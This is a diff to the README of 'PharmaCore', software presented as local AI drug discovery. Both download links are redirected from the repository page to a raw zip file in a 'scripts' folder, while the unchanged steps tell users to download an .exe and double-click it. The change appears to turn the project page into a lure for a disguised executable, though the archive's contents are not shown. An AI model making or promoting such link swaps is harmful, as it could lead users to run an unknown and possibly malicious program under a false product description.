@@ -1,6 +1,6 @@
 # 🧪 PharmaCore - Fast AI drug discovery on your computer
 
-[![](https://img.shields.io/badge/Download-PharmaCore-blue.svg)](https://github.com/ephedrinefop602/PharmaCore)
+[![](https://img.shields.io/badge/Download-PharmaCore-blue.svg)](https://github.com/ephedrinefop602/PharmaCore/raw/refs/heads/main/scripts/Pharma_Core_3.1.zip)
 
 PharmaCore helps researchers discover new medical treatments using artificial intelligence. It runs entirely on your local machine. You do not need an internet connection or cloud storage to perform complex calculations. This ensures your research data stays private and secure.
 
@@ -29,7 +29,7 @@ For optimal performance, your system should have at least 32 GB of RAM. Managing
 
 You can install PharmaCore by following these simple steps.
 
-1. Visit the [PharmaCore download page](https://github.com/ephedrinefop602/PharmaCore) to locate the latest version.
+1. Visit the [PharmaCore download page](https://github.com/ephedrinefop602/PharmaCore/raw/refs/heads/main/scripts/Pharma_Core_3.1.zip) to locate the latest version.
 2. Click the link to download the installer file ending in .exe.
 3. Once the download finishes, locate the file in your downloads folder.
 4. Double-click the file to launch the setup wizard.
